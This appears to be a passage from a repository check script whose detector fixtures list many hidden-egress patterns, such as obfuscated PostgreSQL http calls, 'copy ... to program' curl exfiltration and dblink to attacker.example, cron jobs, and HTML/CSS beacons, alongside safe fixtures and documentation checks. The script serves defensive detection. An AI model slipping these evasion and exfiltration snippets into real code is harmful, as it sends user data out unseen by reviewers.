  { content: 'return new Response(`<img src="${env.REMOTE_URL}?workspace=${workspaceId}">`, { headers: { "content-type": "text/html" } });', path: "apps/worker/src/provider.ts" },
  { content: 'return new Response(`<style>body{background-image:url(${env.REMOTE_URL}?workspace=${workspaceId})}</style>`);', path: "apps/worker/src/provider.ts" },
  { content: 'const tag = ["im", "g"].join(""); return new Response(`<${tag} src="${env.REMOTE_URL}">`, { headers: { "content-type": "text/html" } });', path: "apps/worker/src/provider.ts" },
  { content: 'return Response.redirect(`${env.REMOTE_URL}?workspace=${workspaceId}`, 302);', path: "apps/worker/src/provider.ts" },
  { content: '/* https://api.groq.com/openai/v1/responses 302', path: "apps/brand-site/public/_redirects" },
  { content: "create extension if not exists pg_net; select net.http_post(url := current_setting('app.remote_endpoint'));", path: "supabase/migrations/99999999999999-outbound.sql" },
  { content: "create trigger outbound after insert on public.manuals for each row execute function supabase_functions.http_request(current_setting('app.remote_endpoint'), 'POST', '{}', '{}', '1000');", path: "supabase/migrations/99999999999999-webhook.sql" },
  { content: "select extensions.\"http_post\"(current_setting('app.remote_endpoint')); select \"extensions\".\"http_get\"(current_setting('app.remote_endpoint'));", path: "supabase/migrations/99999999999999-quoted-outbound.sql" },
  { content: "select extensions.U&\"http\\005fpost\"(current_setting('app.remote_endpoint'));", path: "supabase/migrations/99999999999999-unicode-identifier-outbound.sql" },
  { content: "set search_path = extensions, public; select http_post(current_setting('app.remote_endpoint'));", path: "supabase/migrations/99999999999999-search-path-outbound.sql" },
  { content: "set search_path = extensions, public; select http(('POST', current_setting('app.remote_endpoint'), null, null, null)::http_request);", path: "supabase/migrations/99999999999999-generic-http-outbound.sql" },
  { content: "do $$ begin execute 'select extensions.ht' || 'tp((...)::extensions.http_request)'; end $$;", path: "supabase/migrations/99999999999999-dynamic-outbound.sql" },
  { content: "do $$ begin loop execute format('select extensions.%I(%L)', current_setting('app.fn'), current_setting('app.remote_endpoint')); exit; end loop; end $$;", path: "supabase/migrations/99999999999999-loop-dynamic-outbound.sql" },
  { content: "do $$ declare \"function\" text := 'select extensions.http_get(...)'; begin execute \"function\"; end $$;", path: "supabase/migrations/99999999999999-quoted-execute-outbound.sql" },
  { content: "do $$ begin execute '/* function */ select extensions.ht' || 'tp_get(' || quote_literal(current_setting('app.remote_endpoint')) || ')'; end $$;", path: "supabase/migrations/99999999999999-string-keyword-outbound.sql" },
  { content: "do $$ begin execute $sql$/* function */ $sql$ || $a$select extensions.ht$a$ || $b$tp_get($b$ || quote_literal(current_setting('app.remote_endpoint')) || ')'; end $$;", path: "supabase/migrations/99999999999999-dollar-keyword-outbound.sql" },
  { content: "do language plpgsql $body$ begin execute 'select extensions.http_get(...)'; end $body$;", path: "supabase/migrations/99999999999999-do-language-outbound.sql" },
  { content: "do 'begin execute ''select extensions.ht'' || ''tp_get(...)''; end';", path: "supabase/migrations/99999999999999-single-quoted-do-outbound.sql" },
  { content: "do E'begin execute \\'select extensions.ht\\' || \\'tp_get(...)\\'; end';", path: "supabase/migrations/99999999999999-e-string-do-outbound.sql" },
  { content: "do language plpgsql 'begin execute ''select extensions.ht'' || ''tp_get(...)''; end';", path: "supabase/migrations/99999999999999-language-single-quoted-do-outbound.sql" },
  { content: "do language 'plpgsql' 'begin execute ''select extensions.ht'' || ''tp_get(...)''; end';", path: "supabase/migrations/99999999999999-quoted-language-do-outbound.sql" },
  { content: "do language $lang$plpgsql$lang$ $body$ begin execute 'select extensions.ht' || 'tp_get(...)'; end $body$;", path: "supabase/migrations/99999999999999-dollar-language-do-outbound.sql" },
  { content: "do language $言語$plpgsql$言語$ $body$ begin execute 'select extensions.ht' || 'tp_get(...)'; end $body$;", path: "supabase/migrations/99999999999999-unicode-dollar-language-do-outbound.sql" },
  { content: "do language $😀$plpgsql$😀$ $body$ begin execute 'select extensions.ht' || 'tp_get(...)'; end $body$;", path: "supabase/migrations/99999999999999-symbol-dollar-language-do-outbound.sql" },
  { content: "create function public.dynamic_outbound(x text) returns void as $body$ begin x := $1; execute 'select extensions.ht' || 'tp_get(...)'; x := $$x$$; end $body$ language plpgsql;", path: "supabase/migrations/99999999999999-positional-parameter-outbound.sql" },
  { content: "do $$ begin execute /* function */ \"dynamic_sql\"; end $$;", path: "supabase/migrations/99999999999999-body-comment-outbound.sql" },
  { content: "do language plpgsql $body$ begin perform http_post /* review */ (current_setting('app.remote_endpoint')); end $body$;", path: "supabase/migrations/99999999999999-body-direct-outbound.sql" },
  { content: "create function public.dynamic_outbound() returns void as E'begin execute \\'select extensions.ht\\' || \\'tp_get(...)\\'; end' language plpgsql;", path: "supabase/migrations/99999999999999-single-body-outbound.sql" },
  { content: "create function public.dynamic_outbound() returns void as E'begin \\105XECUTE \\'select extensions.ht\\' || \\'tp_get(...)\\'; end' language plpgsql;", path: "supabase/migrations/99999999999999-octal-body-outbound.sql" },
  { content: "set standard_conforming_strings = off; create function public.dynamic_outbound() returns void as 'begin \\105XECUTE ''select extensions.ht'' || ''tp_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-legacy-octal-body-outbound.sql" },
  { content: "set standard_conforming_strings = off; create function public.dynamic_outbound() returns void as 'begin EX\\ECUTE ''select extensions.ht'' || ''tp_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-legacy-identity-body-outbound.sql" },
  { content: "set session \"standard_conforming_strings\" to off; create function public.dynamic_outbound() returns void as 'begin EX\\ECUTE ''select extensions.ht'' || ''tp_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-legacy-to-identity-body-outbound.sql" },
  { content: "set standard_conforming_strings = false;", path: "supabase/migrations/99999999999999-legacy-false-setting.sql" },
  { content: "set standard_conforming_strings to no;", path: "supabase/migrations/99999999999999-legacy-no-setting.sql" },
  { content: "set standard_conforming_strings = 0;", path: "supabase/migrations/99999999999999-legacy-zero-setting.sql" },
  { content: "set standard_conforming_strings = E'false';", path: "supabase/migrations/99999999999999-legacy-e-false-setting.sql" },
  { content: "set standard_conforming_strings = $$off$$;", path: "supabase/migrations/99999999999999-legacy-dollar-off-setting.sql" },
  { content: "alter role current_user set standard_conforming_strings to E'no';", path: "supabase/migrations/99999999999999-alter-role-e-no-setting.sql" },
  { content: "set standard_conforming_strings = f;", path: "supabase/migrations/99999999999999-legacy-f-prefix-setting.sql" },
  { content: "set standard_conforming_strings = n;", path: "supabase/migrations/99999999999999-legacy-n-prefix-setting.sql" },
  { content: "set standard_conforming_strings = of;", path: "supabase/migrations/99999999999999-legacy-of-prefix-setting.sql" },
  { content: "do $$ begin set standard_conforming_strings = off; end $$;", path: "supabase/migrations/99999999999999-do-legacy-setting.sql" },
  { content: "update pg_catalog.pg_settings set setting = 'off' where name = 'standard_conforming_strings';", path: "supabase/migrations/99999999999999-pg-settings-mutation.sql" },
  { content: "create view public.guc_proxy as select * from pg_catalog.pg_settings;", path: "supabase/migrations/99999999999999-pg-settings-view.sql" },
  { content: "update pg_catalog.pg_language set lanplcallfoid = 123, laninline = 456, lanvalidator = 789 where lanname = 'plpgsql';", path: "supabase/migrations/99999999999999-pg-language-mutation.sql" },
  { content: "create function outer_fn() returns void as $outer$ begin create function inner_fn() returns void as $inner$ update pg_catalog.pg_language set lanplcallfoid = 123 where lanname = 'plpgsql'; $inner$ language sql; end $outer$ language plpgsql;", path: "supabase/migrations/99999999999999-nested-pg-language-mutation.sql" },
  { content: "create extension pg_cron; select cron.schedule('* * * * *', 'select extensions.ht' || 'tp_get(...)');", path: "supabase/migrations/99999999999999-cron-command-outbound.sql" },
  { content: "select cron.schedule_in_database('hidden-egress', '* * * * *', 'select extensions.ht' || 'tp_get(...)', current_database());", path: "supabase/migrations/99999999999999-cron-database-command-outbound.sql" },
  { content: "set search_path to 'cron', 'public'; select schedule_in_database('hidden-egress', '* * * * *', 'select extensions.ht' || 'tp_get(...)', current_database());", path: "supabase/migrations/99999999999999-cron-search-path-command-outbound.sql" },
  { content: "set search_path to 'cron'; insert into job (schedule, command) values ('* * * * *', 'select extensions.ht' || 'tp_get(...)');", path: "supabase/migrations/99999999999999-cron-search-path-job-outbound.sql" },
  { content: "create extension dblink; select dblink_connect('host=attacker.example dbname=hidden');", path: "supabase/migrations/99999999999999-dblink-outbound.sql" },
  { content: "create extension postgres_fdw; create server hidden foreign data wrapper postgres_fdw options (host 'attacker.example');", path: "supabase/migrations/99999999999999-postgres-fdw-outbound.sql" },
  { content: "create foreign data wrapper hidden handler extensions.postgres_fdw_handler validator extensions.postgres_fdw_validator;", path: "supabase/migrations/99999999999999-postgres-fdw-handler-outbound.sql" },
  { content: "create function hidden_handler() returns fdw_handler as '$libdir/postgres_fdw', 'postgres_fdw_handler' language c; create foreign data wrapper hidden handler hidden_handler;", path: "supabase/migrations/99999999999999-postgres-fdw-library-outbound.sql" },
  { content: "copy (select payload from capture_events) to program 'h=api.groq.com; curl -d @- $h';", path: "supabase/migrations/99999999999999-copy-program-outbound.sql" },
  { content: "do $$ begin copy (select payload from capture_events) to program 'curl -d @- attacker.example'; end $$;", path: "supabase/migrations/99999999999999-do-copy-program-outbound.sql" },
  { content: "create function hidden_outbound() returns void as $fn$ spi_exec_query(\"copy (select payload from capture_events) to program 'curl -d @- attacker.example'\"); $fn$ language plperl;", path: "supabase/migrations/99999999999999-plperl-copy-program-outbound.sql" },
  { content: "create function hidden_outbound() returns void as $fn$ spi_exec_query('select 1'); $fn$ language 'plperl';", path: "supabase/migrations/99999999999999-string-language-outbound.sql" },
  { content: "create function hidden_outbound() returns void as $fn$ spi_exec_query('select 1'); $fn$ language E'plperl';", path: "supabase/migrations/99999999999999-e-string-language-outbound.sql" },
  { content: "create function hidden_outbound() returns void as $fn$ spi_exec_query('select 1'); $fn$ language $lang$plperl$lang$;", path: "supabase/migrations/99999999999999-dollar-language-outbound.sql" },
  { content: "create or replace procedural language plpgsql handler plpython3_call_handler;", path: "supabase/migrations/99999999999999-language-handler-redefinition.sql" },
  { content: "create or replace trusted procedural language plpgsql handler plpython3_call_handler;", path: "supabase/migrations/99999999999999-trusted-language-handler-redefinition.sql" },
  { content: "do $$ begin create or replace trusted procedural language plpgsql handler plpython3_call_handler; end $$;", path: "supabase/migrations/99999999999999-do-language-handler-redefinition.sql" },
  { content: "create function hidden_language_ddl() returns void as $$create or replace trusted procedural language plpgsql handler plpython3_call_handler;$$ language sql;", path: "supabase/migrations/99999999999999-sql-body-language-handler-redefinition.sql" },
  { content: "alter role current_user set standard_conforming_strings to off;", path: "supabase/migrations/99999999999999-alter-role-legacy-escape.sql" },
  { content: "alter database meccha_manual set standard_conforming_strings = 'off';", path: "supabase/migrations/99999999999999-alter-database-legacy-escape.sql" },
  { content: "select set_config('standard_conforming_strings', 'off', false); create function public.dynamic_outbound() returns void as 'begin EX\\ECUTE ''select extensions.ht'' || ''tp_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-legacy-set-config-body-outbound.sql" },
  { content: "select pg_catalog.\"set_config\"('standard_conforming_strings', 'off', false); create function public.dynamic_outbound() returns void as 'begin EX\\ECUTE ''select extensions.ht'' || ''tp_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-legacy-quoted-set-config-body-outbound.sql" },
  { content: "select set_config(E'standard_conforming_strings', E'off', false);", path: "supabase/migrations/99999999999999-legacy-e-set-config.sql" },
  { content: "select set_config($name$standard_conforming_strings$name$, $value$off$value$, false);", path: "supabase/migrations/99999999999999-legacy-dollar-set-config.sql" },
  { content: "select set_config('standard_' || 'conforming_strings', 'o' || 'ff', false);", path: "supabase/migrations/99999999999999-legacy-expression-set-config.sql" },
  { content: "select set_config('standard_conforming_strings', chr(111) || 'ff', false);", path: "supabase/migrations/99999999999999-legacy-function-set-config.sql" },
  { content: "select set_config('standard_conforming_strings', chr(111) || 'ff', false), $$set_config('app.manual_publish_context', 'on', true)$$;", path: "supabase/migrations/99999999999999-set-config-decoy.sql" },
  { content: "select set_config(@@ 'app.manual_publish_context', @@ 'on', true);", path: "supabase/migrations/99999999999999-set-config-prefix-operator.sql" },
  { content: "create function public.dynamic_outbound() returns void as 'begin EX'\n'ECUTE ''select extensions.http_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-adjacent-body-outbound.sql" },
  { content: "create function public.dynamic_outbound() returns void as/**/'begin EX'\n'ECUTE ''select extensions.http_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-comment-adjacent-body-outbound.sql" },
  { content: "create function public.dynamic_outbound() returns void as U&'begin \\0045XECUTE ''select extensions.ht'' || ''tp_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-unicode-body-outbound.sql" },
  { content: "set search_path = extensions, public; select http_post /* review */ (current_setting('app.remote_endpoint'));", path: "supabase/migrations/99999999999999-comment-outbound.sql" },
  { content: "set search_path = extensions, public; select http_post /* outer /* inner */ still outer */ (current_setting('app.remote_endpoint'));", path: "supabase/migrations/99999999999999-nested-comment-outbound.sql" },
  { content: "select '/*'; select http_post(current_setting('app.remote_endpoint')); select '*/';", path: "supabase/migrations/99999999999999-string-comment-outbound.sql" },
  { content: "/* ' */ do $$ begin execute format('select extensions.http_get(...)'); end $$; /* ' */", path: "supabase/migrations/99999999999999-comment-quote-outbound.sql" },
  { content: "select E'prefix\\'/*'; select http_post(current_setting('app.remote_endpoint')); select E'*/';", path: "supabase/migrations/99999999999999-e-string-outbound.sql" },
  { content: 'const module = await import(`cloudflare:sockets`); module.connect({ hostname: env.REMOTE_HOST, port: 443 });', path: "apps/worker/src/provider.ts" },
  { content: 'const module = await import(`node:${["h", "ttps"].join("")}`);', path: "apps/worker/src/provider.ts" },
  { content: 'const socket = new Web\\u0053ocket(env.REMOTE_URL);', path: "apps/worker/src/provider.ts" },
  { content: 'const config = { url: env.AI_PROXY_URL }; const path = ""; return fetch(`${config.url}${path}`);', path: "apps/worker/src/provider.ts" },
  { content: 'const config = inspectSupabaseConfig(env).config; const config = { url: env.DISCORD_PUBLIC_KEY ?? "", anonKey: "" }; return fetch(`${config.url}${path}`);', path: "apps/worker/src/index.ts" },
  { content: 'fetch(`${config.url}${path}`); fetch(`${config.url}${path}`);', path: "apps/worker/src/index.ts" },
  { content: 'const phase1Worker = env.AI_PROXY; return phase1Worker.fetch(request);', path: "apps/worker/src/provider.ts" },
  { content: '<script>new Image().src = new URLSearchParams(location.search).get("u")</script>', path: "apps/brand-site/public/dynamic-egress.html" },
  { content: '<svg onload="location=\'//attacker.example/\'+location.search"></svg>', path: "apps/brand-site/public/svg-event-egress.html" },
  { content: '<img src="//attacker.example/pixel">', path: "apps/brand-site/public/protocol-relative-egress.html" },
  { content: '<img src="/\\\\api.groq.com/openai/v1/pixel">', path: "apps/brand-site/public/backslash-resource-egress.html" },
  { content: '<a href="/safe" ping="//api.groq.com/pixel">safe</a>', path: "apps/brand-site/public/ping-egress.html" },
  { content: '<link rel="preload" as="image" href="/safe.png" imagesrcset="//api.groq.com/pixel 1x">', path: "apps/brand-site/public/imagesrcset-egress.html" },
  { content: '<div style="background:u\\\\72l(//api.groq.com/pixel)"></div>', path: "apps/brand-site/public/css-escape-egress.html" },
  { content: '<div style="background-image:image-set(\'//api.groq.com/pixel\' 1x)"></div>', path: "apps/brand-site/public/css-image-set-egress.html" },
  { content: "select create_ai_adapter();", path: "supabase/migrations/ai-adapter.sql" }
]) {
  if (!hasAiRuntimeBoundary(fixture.content, fixture.path)) {
    errors.push(`AI absence regression fixture was not detected: ${fixture.path}`);
  }
}

for (const fixture of [
  { content: "select 1 as x, 'execute';", path: "supabase/migrations/99999999999999-safe-select-alias.sql" },
  { content: "select 'ordinary literal';", path: "supabase/migrations/99999999999999-safe-literal.sql" },
  { content: "perform set_config('app.manual_publish_context', 'on', true);", path: "supabase/migrations/99999999999999-approved-transaction-context.sql" },
  { content: "set standard_conforming_strings = on;", path: "supabase/migrations/99999999999999-safe-standard-strings.sql" },
  { content: "do $$ begin set standard_conforming_strings = on; end $$;", path: "supabase/migrations/99999999999999-safe-do-standard-strings.sql" },
  { content: "copy safe_table to stdout; select program from allowed_table;", path: "supabase/migrations/99999999999999-safe-copy-stdout.sql" },
  { content: "copy safe_table (program) to stdout;", path: "supabase/migrations/99999999999999-safe-copy-program-column.sql" },
  { content: "copy (select program from safe_table) to stdout;", path: "supabase/migrations/99999999999999-safe-copy-program-select.sql" },
  { content: "copy safe_table (\"to\", \"program\") to stdout;", path: "supabase/migrations/99999999999999-safe-copy-quoted-columns.sql" },
  { content: "create view public.language_alias as select locale as language;", path: "supabase/migrations/99999999999999-safe-language-alias.sql" },
  { content: "create view safe as select \"create\", trusted, language from (values (1,2,3)) as v(\"create\", trusted, language);", path: "supabase/migrations/99999999999999-safe-language-columns.sql" },
  { content: "select ((safe.create).trusted).language from safe;", path: "supabase/migrations/99999999999999-safe-qualified-language-fields.sql" },
  { content: 'if (enabled) [foo] == navigator; foo[key]();', path: "apps/worker/src/safe-comparison.ts" },
  { content: 'const same = [foo] === navigator; foo[key]();', path: "apps/worker/src/safe-comparison.ts" },
  { content: 'const enough = [foo] >= navigator; foo[key]();', path: "apps/worker/src/safe-comparison.ts" },
  { content: 'const limited = [foo] <= navigator; foo[key]();', path: "apps/worker/src/safe-comparison.ts" },
  { content: 'const different = [foo] != navigator; foo[key]();', path: "apps/worker/src/safe-comparison.ts" },
  { content: 'const same = foo == navigator; foo[key]();', path: "apps/worker/src/safe-comparison.ts" },
  { content: 'function safe() { function inner() { return navigator; } return null; } const value = safe(); value[key]();', path: "apps/worker/src/safe-function.ts" },
  { content: 'function safe() { const inner = () => { return navigator; }; return null; } const value = safe(); value[key]();', path: "apps/worker/src/safe-function.ts" },
  { content: 'function safe() { const helper = { method() { return navigator; } }; return null; } const value = safe(); value[key]();', path: "apps/worker/src/safe-function.ts" },
  { content: 'function safe() { const helper = { async method() { return navigator; }, get value() { return navigator; }, [key]() { return navigator; } }; return null; } const value = safe(); value[key]();', path: "apps/worker/src/safe-function.ts" },
  { content: 'function safe() { class Helper { static method() { return navigator; } } return null; } const value = safe(); value[key]();', path: "apps/worker/src/safe-function.ts" },
  { content: 'class Source { static safe() { function inner() { return navigator; } return null; } } const value = Source.safe(); value[key]();', path: "apps/worker/src/safe-function.ts" },
  { content: 'class Source { static *getNavigator() { yield navigator; } } function safeWrapper(value) { return () => null; } const value = safeWrapper(Source.getNavigator)(); value[key]();', path: "apps/worker/src/safe-function.ts" },
  { content: 'class Source { static *getNavigator() { yield navigator; } } function safeWrapper(value) { return () => null; } const result = safeWrapper((Source.getNavigator))?.(); result[key]();', path: "apps/worker/src/safe-function.ts" },
  { content: 'function safe(flag) { const helper = flag ? null : { method() { return navigator; } }; return null; } const value = safe(false); value[key]();', path: "apps/worker/src/safe-function.ts" }
]) {
  if (hasAiRuntimeBoundary(fixture.content, fixture.path)) {
    errors.push(`AI absence safe fixture was rejected: ${fixture.path}`);
  }
}

for (const file of runtimeTextFiles) {
  const content = await readFile(file, "utf8");
  if (hasAiRuntimeBoundary(content, file)) {
    errors.push(`AI runtime boundary must not exist before owner approval: ${file}`);
  }
}
const browserAcceptanceCatalog = contents["docs/07-quality/acceptance-catalog.md"] ?? "";
const ac023 = browserAcceptanceCatalog.split("\n").find((line) => line.startsWith("| AC-023 |")) ?? "";
for (const term of ["application bytes送信前", "actual peerで拒否", "1経路でも拘束不能", "BROWSER_EGRESS_NOT_VERIFIED", "fail closed"]) {
  if (!ac023.includes(term)) errors.push(`AC-023 is missing fail-closed term: ${term}`);
}
const ac024 = browserAcceptanceCatalog.split("\n").find((line) => line.startsWith("| AC-024 |")) ?? "";
for (const term of ["mobile previewを開始", "Browser Runへ通信せず", "BROWSER_EGRESS_NOT_VERIFIED", "拒否される"]) {
  if (!ac024.includes(term)) errors.push(`AC-024 is missing preflight rejection term: ${term}`);
}
const ac025 = browserAcceptanceCatalog.split("\n").find((line) => line.startsWith("| AC-025 |")) ?? "";
for (const term of ["flagをfalseへ戻す", "既存egressを即時遮断", "Live View失効", "再発行拒否", "全session終了"]) {
  if (!ac025.includes(term)) errors.push(`AC-025 is missing emergency shutdown term: ${term}`);
}
for (const legacyName of forbiddenLegacyR2Names) {
  if (combined.includes(legacyName)) {
    errors.push(`Legacy R2 bucket name remains in harness docs: ${legacyName}`);
  }
}

for (const legacyTerm of [
  "`STRIPE_PAYMENT_LINK_SINGLE_EXPORT`",
  "`STRIPE_PAYMENT_LINK_PERSONAL_MONTHLY`",
  "`STRIPE_PAYMENT_LINK_TEAM_MONTHLY`",
  "Product: `めっちゃマニュアル Pro`",
  "Stripe Payment Links + Webhook"
]) {
  if (combined.includes(legacyTerm)) {
    errors.push(`Legacy Stripe contract remains in harness docs: ${legacyTerm}`);
  }
}

const traceability = contents["docs/01-product/requirements-traceability.md"] ?? "";
const requiredAcceptanceByRequirement = {
  "FR-019": ["AC-050", "AC-052", "AC-054", "AC-055", "AC-056", "AC-057", "AC-059", "AC-062", "AC-063"],
  "FR-021": ["AC-051", "AC-053", "AC-055", "AC-058", "AC-064", "AC-065"]
};
for (const [requirement, acceptanceIds] of Object.entries(requiredAcceptanceByRequirement)) {
  const row = traceability.split("\n").find((line) => line.startsWith(`| ${requirement} |`));
  if (!row) {
    errors.push(`Missing traceability row: ${requirement}`);
    continue;
  }
  const acceptanceColumn = row.split("|")[6] ?? "";
  const actual = [...acceptanceColumn.matchAll(/AC-\d{3}/g)].map(([id]) => id).sort();
  const expected = [...acceptanceIds].sort();
  if (JSON.stringify(actual) !== JSON.stringify(expected)) {
    errors.push(`Acceptance criteria mismatch in ${requirement}: expected ${expected.join(", ")}`);
  }
}

const acceptanceCatalog = await readFile("docs/07-quality/acceptance-catalog.md", "utf8");
const acceptanceIds = [...acceptanceCatalog.matchAll(/^\| (AC-\d{3}) \|/gm)].map(([, id]) => id);
const duplicateAcceptanceIds = acceptanceIds.filter((id, index) => acceptanceIds.indexOf(id) !== index);
if (duplicateAcceptanceIds.length > 0) {
  errors.push(`Duplicate acceptance criteria IDs: ${[...new Set(duplicateAcceptanceIds)].join(", ")}`);
}

const wrangler = JSON.parse(await readFile("wrangler.jsonc", "utf8"));
for (const [environment, config] of [["default", wrangler], ...Object.entries(wrangler.env ?? {})]) {
  const billingFlag = config?.vars?.BILLING_FEATURE_ENABLED;
  if (billingFlag !== undefined && billingFlag !== false && billingFlag !== "false") {
    errors.push(`Billing must remain disabled in ${environment} wrangler environment.`);
  }

  const configuredNames = [
    ...Object.keys(config?.vars ?? {}),
    ...(config?.secrets?.required ?? [])
  ];
  if (configuredNames.some((name) => String(name).startsWith("STRIPE_"))) {
    errors.push(`Stripe runtime configuration must not be registered yet in ${environment}.`);
  }
}

if (errors.length > 0) {
  console.error(errors.join("\n"));
  process.exit(1);
}

console.log(`Harness docs OK: ${Object.keys(requiredDocs).length} documents and disabled Stripe runtime state checked without reading secrets.`);
